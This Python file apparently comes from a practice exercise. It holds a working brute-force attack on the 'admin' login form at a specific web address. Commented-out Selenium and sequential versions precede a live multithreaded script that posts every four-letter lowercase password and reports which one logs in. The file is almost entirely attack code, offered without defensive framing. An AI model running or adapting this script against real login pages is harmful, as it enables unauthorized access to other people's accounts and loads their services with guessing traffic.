# import sys
# from selenium import webdriver
# from selenium.webdriver.common.keys import Keys
# from selenium.webdriver.common.by import By
import string
# from concurrent.futures import ThreadPoolExecutor
# from selenium.common.exceptions import StaleElementReferenceException

# def try_password(driver, heslo):
#     try:
#         # Navigate to the login page
#         driver.get('https://dudo.gvpt.sk/bruteforce2/index.php')
#
#         # Find the username and password fields and input your credentials
#         username_field = driver.find_element(By.NAME, "username")
#         password_field = driver.find_element(By.NAME, "password")
#
#         username_field.clear()
#         password_field.clear()
#
#         username_field.send_keys('admin')
#         password_field.send_keys(heslo)
#
#         # Submit the form
#         password_field.send_keys(Keys.RETURN)
#
#         if 'Úspešne si sa prihlásil' in driver.page_source:
#             print(f"Successfully logged in with password: {heslo}")
#             exit()
#         else:
#             print(f"Login failed with password: {heslo}")
#
#     except StaleElementReferenceException:
#         # Handle stale element reference by refreshing the element and retrying
#         username_field = driver.find_element(By.NAME, "username")
#         password_field = driver.find_element(By.NAME, "password")
#
#         username_field.clear()
#         password_field.clear()
#
#         username_field.send_keys('admin')
#         password_field.send_keys(heslo)
#
#         password_field.send_keys(Keys.RETURN)
#
#         if 'Úspešne si sa prihlásil' in driver.page_source:
#             print(f"Successfully logged in with password: {heslo}")
#             exit()
#         else:
#             print(f"Login failed with password: {heslo}")
#
#     except Exception as e:
#         print(f"An error occurred: {str(e)}")
#
# def initialize_driver():
#     return webdriver.Chrome()
#
# if __name__ == "__main__":
#     alphabet = string.ascii_lowercase
#     password_combinations = [i + j + k + l for i in alphabet for j in alphabet for k in alphabet for l in alphabet]
#
#     # Create a separate driver for each thread
#     drivers = [initialize_driver() for _ in range(4)]  # Adjust the number based on your system's capabilities
#
#     with ThreadPoolExecutor(max_workers=len(drivers)) as executor:
#         executor.map(try_password, drivers * len(password_combinations), password_combinations)
#
#     # Close the drivers when the main script finishes
#     for driver in drivers:
#         driver.quit()

# import string
# import requests
# from bs4 import BeautifulSoup
#
# alphabet = string.ascii_lowercase
# password_combinations = [i + j + k + l for i in alphabet for j in alphabet for k in alphabet for l in alphabet]
# print(password_combinations)
#
#
# for heslo in password_combinations:
#     url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
#     data = {'username': 'admin', 'password': heslo}
#     response = requests.post(url, data=data)
#
#
#     if 'Úspešne si sa prihlásil' in response.text:
#         print(f"Login successful. Password: {heslo}")
#     else:
#         print(f"Login failed. Password: {heslo}")


import string
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# Global variable to indicate successful login
login_successful = False

def try_login(password):
    global login_successful  # Access the global variable

    if login_successful:
        return  # If already successful, no need to continue

    url = 'https://dudo.gvpt.sk/bruteforce2/index.php'
    data = {'username': 'admin', 'password': password}

    # Send a POST request
    response = requests.post(url, data=data)

    # Check if the response contains the success message
    if 'Úspešne si sa prihlásil' in response.text:
        login_successful = True  # Set the global variable to True
        print(f"Login successful. Password: {password}")

    else:
        print(f"Login failed. Password: {password}")

if __name__ == "__main__":
    alphabet = string.ascii_lowercase
    password_combinations = [i + j + k + l for i in alphabet for j in alphabet for k in alphabet for l in alphabet]
    print(password_combinations)

    # Number of concurrent threads
    num_threads = 5  # You can adjust this based on the number of cores you want to utilize

    # Create a ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        # Use executor.map to apply the function concurrently
        results = executor.map(try_login, password_combinations)










































